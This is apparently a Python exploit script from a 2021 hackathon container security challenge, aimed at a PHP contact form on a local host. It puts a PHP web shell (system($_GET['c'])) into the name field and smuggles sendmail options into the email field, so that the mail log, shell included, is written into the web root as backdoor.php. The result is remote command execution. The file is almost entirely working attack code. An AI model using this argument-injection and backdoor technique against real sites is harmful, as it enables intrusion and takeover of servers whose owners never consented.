#!/usr/bin/env python3

# SomeDayPWN at HACKATHON CONTAINER SECURITY CHALLENGE 2021
# 09.12.2021

import requests
from requests_toolbelt import MultipartEncoder

host = "127.0.0.1"
port = "8383"
backdoor = "backdoor.php"

target = f"http://{host}:{port}/"
payload = "<PAYLOAD><?php system($_GET['c']); ?><PAYLOAD>" # inserting <PAYLOAD> tags to easily catching output

data = {'action': 'submit',
		 'name': payload, # Inserting PHP payload
		 'email': f'"SomeDayPWN\\\" -OQueueDirectory=/tmp -X/www/{backdoor} server\" @whocares.org', # ...and copy it into web directory  
		 'message': '.'}

multenc = MultipartEncoder(fields=data, 
						   boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers = {"User-Agent": 'curl/7.74.0', 'Content-Type': multenc.content_type}

r = requests.post(target, data=multenc.to_string(), headers=headers)
